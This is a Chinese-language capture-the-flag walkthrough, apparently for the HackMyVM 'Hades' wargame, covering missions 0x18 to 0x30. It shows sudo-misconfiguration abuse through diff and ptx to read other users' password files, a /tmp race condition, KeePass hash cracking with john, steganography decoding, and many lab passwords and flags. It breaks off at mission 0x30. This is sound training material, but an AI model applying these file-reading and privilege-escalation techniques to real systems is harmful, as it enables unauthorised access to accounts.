<pre class="language-bash" data-language="bash"><code class="language-bash">calliope/IlhyWxZuqIHAuqVOpXfQ</code></pre>
<h2 id="MISSION-0x18"><a href="#MISSION-0x18" class="headerlink" title="MISSION 0x18"></a>MISSION 0x18</h2><pre class="language-bash" data-language="bash"><code class="language-bash">calliope@hades:~$ <span class="token function">cat</span> mission.txt 
<span class="token comment">################</span>
<span class="token comment"># MISSION 0x18 #</span>
<span class="token comment">################</span>

<span class="token comment">## EN ##</span>
The user calypso often uses <span class="token function">write</span> to communicate.

<span class="token comment">## ES ##</span>
La usuaria calypso suele usar <span class="token function">write</span> para comunicarse.</code></pre>
<pre class="language-bash" data-language="bash"><code class="language-bash">calliope@hades:~$ ./writeme  
Cannot send you my pass<span class="token operator">!</span>Cannot send you my pass<span class="token operator">!</span>Cannot send you my pass<span class="token operator">!</span>Cannot send you my pass<span class="token operator">!</span>Cannot send you my pass<span class="token operator">!</span>calliope@hades:~$ </code></pre>
<p>这里没思路，看了别人的wp。write是很远古的工具 可以在tty之间传消息</p>
<pre class="language-bash" data-language="bash"><code class="language-bash">calliope@hades:~$ mesg y
calliope@hades:~$ ./writeme
Cannot send you my pass<span class="token operator">!</span>Cannot send you my pass<span class="token operator">!</span>Cannot send you my pass<span class="token operator">!</span>TAMYefoHcCPmexwImodo^OCbFzMIKPQOZQMEUKwEi^Cannot send you my pass<span class="token operator">!</span>calliope@hades:~$ </code></pre>
<pre class="language-bash" data-language="bash"><code class="language-bash">TAMYefoHcCPmexwImodo
^OCbFzMIKPQOZQMEUKwEi^</code></pre>
<p>原来是个隐藏的flag</p>
<pre class="language-bash" data-language="bash"><code class="language-bash">calypso@hades:~$ <span class="token function">cat</span> flagz.txt 
^pssqdorRTYuTKuQBOYd^</code></pre>
<h2 id="MISSION-0x19"><a href="#MISSION-0x19" class="headerlink" title="MISSION 0x19"></a>MISSION 0x19</h2><pre class="language-bash" data-language="bash"><code class="language-bash">calypso@hades:~$ <span class="token function">cat</span> mission.txt 
<span class="token comment">################</span>
<span class="token comment"># MISSION 0x19 #</span>
<span class="token comment">################</span>

<span class="token comment">## EN ##</span>
User cassandra always wanted to be on TV.

<span class="token comment">## ES ##</span>
La usuaria cassandra siempre quiso salir en la TV.</code></pre>

<pre class="language-bash" data-language="bash"><code class="language-bash">calypso@hades:~$ <span class="token function">ls</span> <span class="token parameter variable">-al</span>
total <span class="token number">8556</span>
drwxr-x--- <span class="token number">2</span> root    calypso    <span class="token number">4096</span> Apr  <span class="token number">5</span> 06:36 <span class="token builtin class-name">.</span>
drwxr-xr-x <span class="token number">1</span> root    root       <span class="token number">4096</span> Apr  <span class="token number">5</span> 06:36 <span class="token punctuation">..</span>
-rw-r--r-- <span class="token number">1</span> calypso calypso     <span class="token number">220</span> Apr <span class="token number">23</span>  <span class="token number">2023</span> .bash_logout
-rw-r--r-- <span class="token number">1</span> calypso calypso    <span class="token number">3526</span> Apr <span class="token number">23</span>  <span class="token number">2023</span> .bashrc
-rw-r--r-- <span class="token number">1</span> calypso calypso     <span class="token number">807</span> Apr <span class="token number">23</span>  <span class="token number">2023</span> .profile
-rw-r----- <span class="token number">1</span> root    calypso <span class="token number">8726358</span> Dec <span class="token number">20</span>  <span class="token number">2021</span> cassy.wav
-rw-r----- <span class="token number">1</span> root    calypso      <span class="token number">22</span> Apr  <span class="token number">5</span> 06:36 flagz.txt
-rw-r----- <span class="token number">1</span> root    calypso     <span class="token number">164</span> Apr  <span class="token number">5</span> 06:36 mission.txt</code></pre>
<p>下载下来试了一下发现是SSTV，用手机上的Robot36听<br><img src="https://ooo.0x0.ooo/2024/06/25/OPhRSG.jpg" alt="OPhRSG.jpg" loading="lazy"><br><code>CKzlnvmHOz</code>应该是密码</p>
<pre class="language-bash" data-language="bash"><code class="language-bash">cassandra@127.0.0.1's password: 
Permission denied, please try again.</code></pre>
<p>很幽默吗仔细看了一下发现倒数第二位是Q</p>
<pre class="language-bash" data-language="bash"><code class="language-bash">CKzlnvmHQz</code></pre>
<pre class="language-bash" data-language="bash"><code class="language-bash">cassandra@hades:~$ <span class="token function">ls</span> <span class="token parameter variable">-al</span>
total <span class="token number">36</span>
drwxr-x--- <span class="token number">2</span> root      cassandra <span class="token number">4096</span> Apr  <span class="token number">5</span> 06:36 <span class="token builtin class-name">.</span>
drwxr-xr-x <span class="token number">1</span> root      root      <span class="token number">4096</span> Apr  <span class="token number">5</span> 06:36 <span class="token punctuation">..</span>
-rw-r--r-- <span class="token number">1</span> cassandra cassandra  <span class="token number">220</span> Apr <span class="token number">23</span>  <span class="token number">2023</span> .bash_logout
-rw-r--r-- <span class="token number">1</span> cassandra cassandra <span class="token number">3526</span> Apr <span class="token number">23</span>  <span class="token number">2023</span> .bashrc
-rw-r--r-- <span class="token number">1</span> cassandra cassandra  <span class="token number">807</span> Apr <span class="token number">23</span>  <span class="token number">2023</span> .profile
-rw-r----- <span class="token number">1</span> root      cassandra   <span class="token number">22</span> Apr  <span class="token number">5</span> 06:36 flagz.txt
-rw-r----- <span class="token number">1</span> root      cassandra  <span class="token number">369</span> Apr  <span class="token number">5</span> 06:36 here.txt
-rw-r----- <span class="token number">1</span> root      cassandra  <span class="token number">147</span> Apr  <span class="token number">5</span> 06:36 mission.txt
cassandra@hades:~$ <span class="token function">cat</span> flagz.txt 
^lntvcYNlazEljOyZYKz^</code></pre>
<h2 id="MISSION-0x20"><a href="#MISSION-0x20" class="headerlink" title="MISSION 0x20"></a>MISSION 0x20</h2><pre class="language-bash" data-language="bash"><code class="language-bash">cassandra@hades:~$ <span class="token function">cat</span> mission.txt 
<span class="token comment">################</span>
<span class="token comment"># MISSION 0x20 #</span>
<span class="token comment">################</span>

<span class="token comment">## EN ##</span>
User cassiopeia sees the invisible. 

<span class="token comment">## ES ##</span>
La usuaria cassiopeia ve lo invisible.</code></pre>
<pre class="language-bash" data-language="bash"><code class="language-bash">cassandra@hades:~$ <span class="token function">cat</span> here.txt 
VGhlIHBhc3N3b3JkIG9mIGNhc3Npb3BlaWEgaXM6CSAgICAgIAkgICAgCSAgIAkgICAgIAkgICAg
CSAgICAKICAgCSAgICAJICAJICAgIAkgCSAgIAkgICAgICAgCSAgICAJICAgIAoJICAgICAgCQkg
CSAgIAkgICAJICAgIAkgICAgIAkgICAgIAkgIAogICAJIAkgICAgIAkgICAgICAJICAgIAkgICAg
ICAJICAJICAJIAkgICAKICAgCSAgICAgIAkgICAgCSAJICAgICAJICAgICAgCSAgICAJICAgCSAg
<span class="token assign-left variable">ICAgCgkgICAgCSAgICAJIAkgICAgICAJICAgICAJIAkgCSAgICAgICAJIAo</span><span class="token operator">=</span></code></pre>
<p><img src="https://ooo.0x0.ooo/2024/06/25/OPhtw1.png" alt="OPhtw1.png" loading="lazy"><br>盲猜测snow隐写<br><img src="https://ooo.0x0.ooo/2024/06/25/OPhHDD.png" alt="OPhHDD.png" loading="lazy"></p>
<pre class="language-bash" data-language="bash"><code class="language-bash">gRqFnHblmZVZSfegPLvO</code></pre>
<pre class="language-bash" data-language="bash"><code class="language-bash">cassiopeia@hades:~$ <span class="token function">cat</span> flagz.txt 
^GyWbcpEpqMsqMsjilzX^</code></pre>
<h2 id="MISSION-0x21"><a href="#MISSION-0x21" class="headerlink" title="MISSION 0x21"></a>MISSION 0x21</h2><pre class="language-bash" data-language="bash"><code class="language-bash">cassiopeia@hades:~$ <span class="token function">cat</span> mission.txt 
<span class="token comment">################</span>
<span class="token comment"># MISSION 0x21 #</span>
<span class="token comment">################</span>

<span class="token comment">## EN ##</span>
User clio hates spaces. 

<span class="token comment">## ES ##</span>
La usuaria clio odia los espacios.</code></pre>
<pre class="language-bash" data-language="bash"><code class="language-bash">cassiopeia@hades:~$ <span class="token function">sudo</span> <span class="token parameter variable">-l</span>
Matching Defaults entries <span class="token keyword">for</span> cassiopeia on hades:
    env_reset, mail_badpass, <span class="token assign-left variable">secure_path</span><span class="token operator">=</span>/usr/local/sbin<span class="token punctuation">\</span>:/usr/local/bin<span class="token punctuation">\</span>:/usr/sbin<span class="token punctuation">\</span>:/usr/bin<span class="token punctuation">\</span>:/sbin<span class="token punctuation">\</span>:/bin, use_pty

User cassiopeia may run the following commands on hades:
    <span class="token punctuation">(</span>clio<span class="token punctuation">)</span> NOPASSWD: /bin/bash <span class="token parameter variable">-c</span> /usr/local/src/differences.sh
cassiopeia@hades:~$ <span class="token function">cat</span> /usr/local/src/differences.sh

<span class="token comment">#!/bin/bash</span>
<span class="token builtin class-name">echo</span> File to compare:<span class="token operator">!</span>
<span class="token builtin class-name">read</span> differences
<span class="token assign-left variable"><span class="token environment constant">IFS</span></span><span class="token operator">=</span><span class="token number">0</span> <span class="token builtin class-name">read</span> file1 file2 <span class="token operator">&lt;&lt;&lt;</span> <span class="token string">"<span class="token variable">$differences</span>"</span>

<span class="token keyword">if</span> <span class="token punctuation">[</span><span class="token punctuation">[</span> <span class="token string">"<span class="token variable">$differences</span>"</span> <span class="token operator">=~</span> <span class="token punctuation">\</span> <span class="token operator">|</span><span class="token punctuation">\</span>' <span class="token punctuation">]</span><span class="token punctuation">]</span>
<span class="token keyword">then</span>
   <span class="token builtin class-name">echo</span> <span class="token string">"No spaces!!"</span>
<span class="token keyword">else</span>
/usr/bin/diff <span class="token variable">$file1</span> <span class="token variable">$file2</span>
<span class="token keyword">fi</span></code></pre>
<p>diff可以用来读文件 <code>diff filename /dev/null</code>不过这里分隔符是0<br>读下密码</p>
<pre class="language-bash" data-language="bash"><code class="language-bash">cassiopeia@hades:~$ <span class="token function">find</span> / <span class="token parameter variable">-name</span> clio* <span class="token operator"><span class="token file-descriptor important">2</span>></span>/dev/null <span class="token parameter variable">-ls</span>
  <span class="token number">1054047</span>      <span class="token number">4</span> -rw-r-----   <span class="token number">1</span> root     clio           <span class="token number">21</span> Apr  <span class="token number">5</span> 06:36 /var/local/clio_pass.txt
  <span class="token number">1050141</span>      <span class="token number">4</span> drwxr-x---   <span class="token number">2</span> root     clio         <span class="token number">4096</span> Apr  <span class="token number">5</span> 06:36 /pwned/clio
cassiopeia@hades:~$ <span class="token function">sudo</span> <span class="token parameter variable">-u</span> clio /bin/bash <span class="token parameter variable">-c</span> /usr/local/src/differences.sh
File to compare:<span class="token operator">!</span>
/dev/null0/var/local/clio_pass.txt
0a1
<span class="token operator">></span> cqJqRPaUtuoUYXbaxnZq</code></pre>
<pre class="language-bash" data-language="bash"><code class="language-bash">cassiopeia@hades:~$ <span class="token function">sudo</span> <span class="token parameter variable">-u</span> clio /bin/bash <span class="token parameter variable">-c</span> /usr/local/src/differences.sh
File to compare:<span class="token operator">!</span>
/dev/null0/pwned/clio/flagz.txt
0a1
<span class="token operator">></span> ^XUJbvPwAZYgoUgkpeSv^</code></pre>
<p>顺便拿下flag</p>
<h2 id="MISSION-0x22"><a href="#MISSION-0x22" class="headerlink" title="MISSION 0x22"></a>MISSION 0x22</h2><pre class="language-bash" data-language="bash"><code class="language-bash">clio@hades:~$ <span class="token function">cat</span> mission.txt 
<span class="token comment">################</span>
<span class="token comment"># MISSION 0x22 #</span>
<span class="token comment">################</span>

<span class="token comment">## EN ##</span>
The user cybele uses her lastname as a password.

<span class="token comment">## ES ##</span>
La usuaria cybele usa <span class="token function">su</span> apellido como password.</code></pre>
<p>cybele用她姓作为密码<br>在<code>/etc/passwd</code>下找到密码<code>UICacOPmJMWbKyPwNZod</code></p>
<pre class="language-bash" data-language="bash"><code class="language-bash">cybele:x:2014:2014:UICacOPmJMWbKyPwNZod:/pwned/cybele:/bin/bash</code></pre>
<pre class="language-bash" data-language="bash"><code class="language-bash">cybele@hades:~$ <span class="token function">cat</span> flagz.txt 
^bTsTIOmJELcaxEiIaCA^</code></pre>
<h2 id="MISSION-0x23"><a href="#MISSION-0x23" class="headerlink" title="MISSION 0x23"></a>MISSION 0x23</h2><pre class="language-bash" data-language="bash"><code class="language-bash">cybele@hades:~$ <span class="token function">cat</span> mission.txt 
<span class="token comment">################</span>
<span class="token comment"># MISSION 0x23 #</span>
<span class="token comment">################</span>

<span class="token comment">## EN ##</span>
User cynthia sees things that others dont.

<span class="token comment">## ES ##</span>
La usuaria cynthia ve cosas que el resto no ven.</code></pre>
<p>cynthia可以看见其他人看不见的东西，隐写？</p>
<pre class="language-bash" data-language="bash"><code class="language-bash">cybele@hades:~$ <span class="token function">ls</span> <span class="token parameter variable">-al</span>
total <span class="token number">3220</span>
drwxr-x--- <span class="token number">2</span> root   cybele    <span class="token number">4096</span> Apr  <span class="token number">5</span> 06:36 <span class="token builtin class-name">.</span>
drwxr-xr-x <span class="token number">1</span> root   root      <span class="token number">4096</span> Apr  <span class="token number">5</span> 06:36 <span class="token punctuation">..</span>
-rw-r--r-- <span class="token number">1</span> cybele cybele     <span class="token number">220</span> Apr <span class="token number">23</span>  <span class="token number">2023</span> .bash_logout
-rw-r--r-- <span class="token number">1</span> cybele cybele    <span class="token number">3526</span> Apr <span class="token number">23</span>  <span class="token number">2023</span> .bashrc
-rw-r--r-- <span class="token number">1</span> cybele cybele     <span class="token number">807</span> Apr <span class="token number">23</span>  <span class="token number">2023</span> .profile
-rw-r----- <span class="token number">1</span> root   cybele      <span class="token number">22</span> Apr  <span class="token number">5</span> 06:36 flagz.txt
-rw-r----- <span class="token number">1</span> root   cybele <span class="token number">3263057</span> Dec <span class="token number">30</span>  <span class="token number">2021</span> fun.png
-rw-r----- <span class="token number">1</span> root   cybele     <span class="token number">163</span> Apr  <span class="token number">5</span> 06:36 mission.txt</code></pre>
<p>目录下有个fun的png文件</p>
<pre class="language-bash" data-language="bash"><code class="language-bash"><span class="token operator">></span> <span class="token function">scp</span> <span class="token parameter variable">-r</span> <span class="token parameter variable">-P</span> <span class="token number">6666</span> cybele@hades.hackmyvm.eu:/pwned/cybele/fun.png <span class="token builtin class-name">.</span> 
<span class="token operator">></span> <span class="token function">file</span> fun.png                               
fun.png: PNG image data, <span class="token number">1600</span> x <span class="token number">1980</span>, <span class="token number">8</span>-bit/color RGBA, non-interlaced</code></pre>
<p><img src="https://ooo.0x0.ooo/2024/07/06/OPLY8p.png" alt="OPLY8p.png" loading="lazy"><br>拿到cynthia密码<code>QHLjXdGSiRShtWpMwFjj</code></p>
<pre class="language-bash" data-language="bash"><code class="language-bash">cynthia@hades:~$ <span class="token function">cat</span> flagz.txt 
^ZRSCKeYYlHkCEiHsEOI^</code></pre>
<h2 id="MISSION-0x24"><a href="#MISSION-0x24" class="headerlink" title="MISSION 0x24"></a>MISSION 0x24</h2><pre class="language-bash" data-language="bash"><code class="language-bash">cynthia@hades:~$ <span class="token function">cat</span> mission.txt 
<span class="token comment">################</span>
<span class="token comment"># MISSION 0x24 #</span>
<span class="token comment">################</span>

<span class="token comment">## EN ##</span>
User daphne once told us: Gemini? gem-evil.hmv? WTF?

<span class="token comment">## ES ##</span>
La usuaria daphne nos dijo una vez: Gemini? gem-evil.hmv? WTF?</code></pre>
<pre class="language-bash" data-language="bash"><code class="language-bash">cynthia@hades:~$ <span class="token function">curl</span> gem-evil.hmv
curl: <span class="token punctuation">(</span><span class="token number">6</span><span class="token punctuation">)</span> Could not resolve host: gem-evil.hmv</code></pre>
<p>访问不了，做个端口转发到本地看看怎么个事<br>md，没ss指令不知道开放了哪个端口<br>传个ss上去</p>
<pre class="language-bash" data-language="bash"><code class="language-bash">cynthia@hades:/var/tmp$ <span class="token function">cat</span> <span class="token number">456</span> <span class="token operator">|</span>base64 <span class="token parameter variable">-d</span> <span class="token operator">></span> <span class="token number">446</span> 
cynthia@hades:/var/tmp$ <span class="token function">chmod</span> +x <span class="token number">446</span>
cynthia@hades:/var/tmp$ ./446 <span class="token parameter variable">-tulnp</span>
Netid                   State                    Recv-Q                   Send-Q                                     Local Address:Port                                       Peer Address:Port                   Process                 
udp                     UNCONN                   <span class="token number">0</span>                        <span class="token number">0</span>                                             <span class="token number">127.0</span>.0.11:56483                                           <span class="token number">0.0</span>.0.0:*                                              
udp                     UNCONN                   <span class="token number">0</span>                        <span class="token number">0</span>                                                <span class="token number">0.0</span>.0.0:44595                                           <span class="token number">0.0</span>.0.0:*                                              
udp                     UNCONN                   <span class="token number">0</span>                        <span class="token number">0</span>                                                <span class="token number">0.0</span>.0.0:55168                                           <span class="token number">0.0</span>.0.0:*                                              
tcp                     LISTEN                   <span class="token number">0</span>                        <span class="token number">4096</span>                                          <span class="token number">127.0</span>.0.11:38595                                           <span class="token number">0.0</span>.0.0:*                                              
tcp                     LISTEN                   <span class="token number">0</span>                        <span class="token number">128</span>                                            <span class="token number">127.0</span>.0.1:6667                                            <span class="token number">0.0</span>.0.0:*                                              
tcp                     LISTEN                   <span class="token number">0</span>                        <span class="token number">511</span>                                              <span class="token number">0.0</span>.0.0:80                                              <span class="token number">0.0</span>.0.0:*                                              
tcp                     LISTEN                   <span class="token number">0</span>                        <span class="token number">128</span>                                              <span class="token number">0.0</span>.0.0:22                                              <span class="token number">0.0</span>.0.0:*                                              
tcp                     LISTEN                   <span class="token number">0</span>                        <span class="token number">1024</span>                                                   *:1965                                                  *:*                                              
tcp                     LISTEN                   <span class="token number">0</span>                        <span class="token number">511</span>                                                 <span class="token punctuation">[</span>::<span class="token punctuation">]</span>:80                                                 <span class="token punctuation">[</span>::<span class="token punctuation">]</span>:*                                              
tcp                     LISTEN                   <span class="token number">0</span>                        <span class="token number">32</span>                                                     *:21                                                    *:*                                              
tcp                     LISTEN                   <span class="token number">0</span>                        <span class="token number">128</span>                                                 <span class="token punctuation">[</span>::<span class="token punctuation">]</span>:22                                                 <span class="token punctuation">[</span>::<span class="token punctuation">]</span>:*        </code></pre>
<p>估计是这个1965端口<br>转发到本地看看</p>
<pre class="language-bash" data-language="bash"><code class="language-bash"><span class="token operator">></span> <span class="token function">ssh</span> <span class="token parameter variable">-p</span> <span class="token number">6666</span> cynthia@hades.hackmyvm.eu <span class="token parameter variable">-L</span> <span class="token number">1965</span>:127.0.0.1:1965</code></pre>
<p>然后用gemini协议访问gem-evil.hmv<br>先下载个amfora</p>
<pre class="language-bash" data-language="bash"><code class="language-bash"><span class="token function">sudo</span> <span class="token function">apt-get</span> <span class="token function">install</span> amfora</code></pre>
<p>保持端口转发的ssh不要端口然后访问gem-evil.hmv</p>
<pre class="language-bash" data-language="bash"><code class="language-bash">amfora gemini://gem-evil.hmv</code></pre>
<p><img src="https://ooo.0x0.ooo/2024/07/06/OPL6Bq.png" alt="OPL6Bq.png" loading="lazy"><br>拿到密码<code>EkdtKuXCJjlFKFpKgddX</code></p>
<pre class="language-bash" data-language="bash"><code class="language-bash">daphne@hades:~$ <span class="token function">cat</span> flagz.txt 
^ieOhnUKZlYZSSrIPgaJ^</code></pre>
<h2 id="MISSION-0x25"><a href="#MISSION-0x25" class="headerlink" title="MISSION 0x25"></a>MISSION 0x25</h2><pre class="language-bash" data-language="bash"><code class="language-bash">daphne@hades:~$ <span class="token function">cat</span> mission.txt 
<span class="token comment">################</span>
<span class="token comment"># MISSION 0x25 #</span>
<span class="token comment">################</span>

<span class="token comment">## EN ##</span>
The user delia has a good memory, she only has to see her password <span class="token keyword">for</span> a few seconds to remember it.

<span class="token comment">## ES ##</span>
La usuaria delia tiene buena memoria, solo tiene que ver unos segundos <span class="token function">su</span> password para recordarlo.</code></pre>
<pre class="language-bash" data-language="bash"><code class="language-bash">daphne@hades:~$ <span class="token function">cat</span> old.sh 

<span class="token comment">#!/bin/bash</span>
<span class="token comment">#OUTPUT="PASSWORD_DELIA" &lt;-- UPDATE IT!</span>
<span class="token assign-left variable">secretfile</span><span class="token operator">=</span><span class="token variable"><span class="token variable">$(</span>mktemp /tmp/XXX<span class="token variable">)</span></span>
<span class="token function">chmod</span> <span class="token number">664</span> <span class="token string">"<span class="token variable">$secretfile</span>"</span>
<span class="token builtin class-name">exec</span> <span class="token operator"><span class="token file-descriptor important">5</span>></span><span class="token string">"<span class="token variable">$secretfile</span>"</span>
<span class="token builtin class-name">echo</span> <span class="token variable">$OUTPUT</span> <span class="token operator">></span><span class="token file-descriptor important">&amp;5</span>
<span class="token function">sleep</span> <span class="token number">0.01</span>
<span class="token function">rm</span> <span class="token string">"<span class="token variable">$secretfile</span>"</span></code></pre>
<p>密码生成在&#x2F;tmp目录下的xxx文件，看了群主的wp，通过把tmp写满，让他把密码写在指定文件并且可读,那就删一个tmp下的目录</p>
<pre class="language-bash" data-language="bash"><code class="language-bash">daphne@hades:~$ <span class="token function">ls</span> <span class="token parameter variable">-al</span> /tmp/tao
-rw-r--r-- <span class="token number">1</span> daphne daphne <span class="token number">0</span> Jul  <span class="token number">3</span> 09:34 /tmp/tao
daphne@hades:~$ <span class="token function">rm</span> /tmp/tao</code></pre>
<pre class="language-bash" data-language="bash"><code class="language-bash">daphne@hades:~$ <span class="token keyword">while</span> <span class="token builtin class-name">:</span><span class="token punctuation">;</span> <span class="token keyword">do</span> <span class="token punctuation">[</span><span class="token punctuation">[</span> <span class="token parameter variable">-f</span> /tmp/tao <span class="token punctuation">]</span><span class="token punctuation">]</span> <span class="token operator">&amp;&amp;</span> <span class="token function">cat</span> /tmp/tao<span class="token punctuation">;</span> <span class="token keyword">done</span></code></pre>
<p>再开个端口利用死循环监听这个文件然后读,另一半执行sudo</p>
<pre class="language-bash" data-language="bash"><code class="language-bash">daphne@hades:~$ <span class="token function">sudo</span> <span class="token parameter variable">-l</span>
Matching Defaults entries <span class="token keyword">for</span> daphne on hades:
    env_reset, mail_badpass, <span class="token assign-left variable">secure_path</span><span class="token operator">=</span>/usr/local/sbin<span class="token punctuation">\</span>:/usr/local/bin<span class="token punctuation">\</span>:/usr/sbin<span class="token punctuation">\</span>:/usr/bin<span class="token punctuation">\</span>:/sbin<span class="token punctuation">\</span>:/bin, use_pty

User daphne may run the following commands on hades:
    <span class="token punctuation">(</span>delia<span class="token punctuation">)</span> NOPASSWD: /bin/bash <span class="token parameter variable">-c</span> /usr/local/src/new.sh
daphne@hades:~$ <span class="token function">sudo</span> <span class="token parameter variable">-u</span> delia /bin/bash <span class="token parameter variable">-c</span> /usr/local/src/new.sh</code></pre>
<pre class="language-bash" data-language="bash"><code class="language-bash">daphne@hades:~$ <span class="token keyword">while</span> <span class="token builtin class-name">:</span><span class="token punctuation">;</span> <span class="token keyword">do</span> <span class="token punctuation">[</span><span class="token punctuation">[</span> <span class="token parameter variable">-f</span> /tmp/tao <span class="token punctuation">]</span><span class="token punctuation">]</span> <span class="token operator">&amp;&amp;</span> <span class="token function">cat</span> /tmp/tao<span class="token punctuation">;</span> <span class="token keyword">done</span>
bNCvocyOpoMVeCtxrhTt
bNCvocyOpoMVeCtxrhTt
bNCvocyOpoMVeCtxrhTt
bNCvocyOpoMVeCtxrhTt
bNCvocyOpoMVeCtxrhTt
cat: /tmp/tao: No suc</code></pre>
<p>拿到密码<code>bNCvocyOpoMVeCtxrhTt</code></p>
<pre class="language-bash" data-language="bash"><code class="language-bash">delia@hades:~$ <span class="token function">cat</span> flagz.txt 
^QfaHPyEqMepsOdMxQCQ^</code></pre>
<h2 id="MISSION-0x26"><a href="#MISSION-0x26" class="headerlink" title="MISSION 0x26"></a>MISSION 0x26</h2><pre class="language-bash" data-language="bash"><code class="language-bash">delia@hades:~$ <span class="token function">cat</span> mission.txt 
<span class="token comment">################</span>
<span class="token comment"># MISSION 0x26 #</span>
<span class="token comment">################</span>

<span class="token comment">## EN ##</span>
User demeter reads <span class="token keyword">in</span> another language.

<span class="token comment">## ES ##</span>
La usuaria demeter lee en otro idioma.</code></pre>
<pre class="language-bash" data-language="bash"><code class="language-bash">delia@hades:~$ ./showpass 

FkyuXkkJNONDChoaKzOI</code></pre>
<p>为什么直接给密码</p>
<pre class="language-bash" data-language="bash"><code class="language-bash">demeter@hades:~$ <span class="token function">cat</span> flagz.txt 
^JiviWHRVRZLSfjBuwAi^</code></pre>
<h2 id="MISSION-0x27"><a href="#MISSION-0x27" class="headerlink" title="MISSION 0x27"></a>MISSION 0x27</h2><pre class="language-bash" data-language="bash"><code class="language-bash">demeter@hades:~$ <span class="token function">cat</span> mission.txt 
<span class="token comment">################</span>
<span class="token comment"># MISSION 0x27 #</span>
<span class="token comment">################</span>

<span class="token comment">## EN ##</span>
The user <span class="token builtin class-name">echo</span> permute.

<span class="token comment">## ES ##</span>
La usuaria <span class="token builtin class-name">echo</span> permuta.</code></pre>
<pre class="language-bash" data-language="bash"><code class="language-bash">demeter@hades:~$ <span class="token function">sudo</span> <span class="token parameter variable">-l</span>
Matching Defaults entries <span class="token keyword">for</span> demeter on hades:
    env_reset, mail_badpass, <span class="token assign-left variable">secure_path</span><span class="token operator">=</span>/usr/local/sbin<span class="token punctuation">\</span>:/usr/local/bin<span class="token punctuation">\</span>:/usr/sbin<span class="token punctuation">\</span>:/usr/bin<span class="token punctuation">\</span>:/sbin<span class="token punctuation">\</span>:/bin, use_pty

User demeter may run the following commands on hades:
    <span class="token punctuation">(</span>echo<span class="token punctuation">)</span> NOPASSWD: /usr/bin/ptx
demeter@hades:~$ </code></pre>
<pre class="language-bash" data-language="bash"><code class="language-bash">demeter@hades:~$ <span class="token function">sudo</span> <span class="token parameter variable">-u</span> <span class="token builtin class-name">echo</span> ptx <span class="token parameter variable">-w</span> <span class="token number">5000</span> /usr/local/games/echo_pass.txt
GztROerShmiyiCIlfepG</code></pre>
<pre class="language-bash" data-language="bash"><code class="language-bash">echo@hades:~$ <span class="token function">cat</span> flagz.txt 
^abeDeOxlPMAABepeBHy^</code></pre>
<h2 id="MISSION-0x28"><a href="#MISSION-0x28" class="headerlink" title="MISSION 0x28"></a>MISSION 0x28</h2><pre class="language-bash" data-language="bash"><code class="language-bash">echo@hades:~$ <span class="token function">cat</span> mission.txt 
<span class="token comment">################</span>
<span class="token comment"># MISSION 0x28 #</span>
<span class="token comment">################</span>

<span class="token comment">## EN ##</span>
The user eos can see the sounds.

<span class="token comment">## ES ##</span>
La usuaria eos puede ver los sonidos.</code></pre>
<p>音频隐写?<br><img src="https://ooo.0x0.ooo/2024/07/06/OPL8Kc.png" alt="OPL8Kc.png" loading="lazy"><br><code>CWBKRQX</code></p>
<pre class="language-bash" data-language="bash"><code class="language-bash">eos@hades:~$ <span class="token function">cat</span> flagz.txt 
^OsoLytPlXEjvinhCNyy^</code></pre>
<h2 id="MISSION-0x29"><a href="#MISSION-0x29" class="headerlink" title="MISSION 0x29"></a>MISSION 0x29</h2><pre class="language-bash" data-language="bash"><code class="language-bash">eos@hades:~$ <span class="token function">cat</span> mission.txt 
<span class="token comment">################</span>
<span class="token comment"># MISSION 0x29 #</span>
<span class="token comment">################</span>

<span class="token comment">## EN ##</span>
The user gaia is very careful saving her passwords.

<span class="token comment">## ES ##</span>
La usuaria gaia es muy precavida guardando sus passwords.</code></pre>
<p>爆破</p>
<pre class="language-bash" data-language="bash"><code class="language-bash"> ~/Desktop                                                                                                                                                                                                       INT  root@kali2  <span class="token number">16</span>:00:51 
<span class="token operator">></span> keepass2john secretz.kbdx <span class="token operator">></span> pass.txt   

 ~/Desktop                                                                                                                                                                                                            root@kali2  <span class="token number">16</span>:01:38 
<span class="token operator">></span> john pass.txt <span class="token parameter variable">--wordlist</span><span class="token operator">=</span>/usr/share/wordlists/rockyou.txt 
Using default input encoding: UTF-8
Loaded <span class="token number">1</span> password <span class="token builtin class-name">hash</span> <span class="token punctuation">(</span>KeePass <span class="token punctuation">[</span>SHA256 AES <span class="token number">32</span>/64<span class="token punctuation">]</span><span class="token punctuation">)</span>
Cost <span class="token number">1</span> <span class="token punctuation">(</span>iteration count<span class="token punctuation">)</span> is <span class="token number">60000</span> <span class="token keyword">for</span> all loaded hashes
Cost <span class="token number">2</span> <span class="token punctuation">(</span>version<span class="token punctuation">)</span> is <span class="token number">2</span> <span class="token keyword">for</span> all loaded hashes
Cost <span class="token number">3</span> <span class="token punctuation">(</span>algorithm <span class="token punctuation">[</span><span class="token number">0</span><span class="token operator">=</span>AES <span class="token assign-left variable">1</span><span class="token operator">=</span>TwoFish <span class="token assign-left variable">2</span><span class="token operator">=</span>ChaCha<span class="token punctuation">]</span><span class="token punctuation">)</span> is <span class="token number">0</span> <span class="token keyword">for</span> all loaded hashes
Press <span class="token string">'q'</span> or Ctrl-C to abort, almost any other key <span class="token keyword">for</span> status
heaven           <span class="token punctuation">(</span>secretz.kbdx<span class="token punctuation">)</span>     
1g <span class="token number">0</span>:00:00:02 DONE <span class="token punctuation">(</span><span class="token number">2024</span>-07-06 <span class="token number">16</span>:01<span class="token punctuation">)</span> <span class="token number">0</span>.4424g/s <span class="token number">82</span>.74p/s <span class="token number">82</span>.74c/s <span class="token number">82</span>.74C/s heaven
Use the <span class="token string">"--show"</span> option to display all of the cracked passwords reliably
Session completed. </code></pre>
<p>打开密码是<code>heaven</code><br><img src="https://ooo.0x0.ooo/2024/07/06/OPLX0r.png" alt="OPLX0r.png" loading="lazy"><br><code>sbUcegcdYTTWzTKojzgm</code></p>
<pre class="language-bash" data-language="bash"><code class="language-bash">gaia@hades:~$ <span class="token function">cat</span> flagz.txt 
^NWelryzwJowjEaDWEiY^</code></pre>
<h2 id="MISSION-0x30"><a href="#MISSION-0x30" class="headerlink" title="MISSION 0x30"></a>MISSION 0x30</h2><pre class="language-bash" data-language="bash"><code class="language-bash">gaia@hades:~$ <span class="token function">cat</span> mission.txt 
<span class="token comment">################</span>
<span class="token comment"># MISSION 0x30 #</span>
<span class="token comment">################</span>

<span class="token comment">## EN ##</span>
User halcyon wants all the powah.

<span class="token comment">## ES ##</span>
La usuaria halcyon quiere todo el powah.</code></pre>
<pre class="language-bash" data-language="bash"><code class="language-bash">gaia@hades:~$ <span class="token function">ls</span> <span class="token parameter variable">-al</span>
total <span class="token number">40</span>
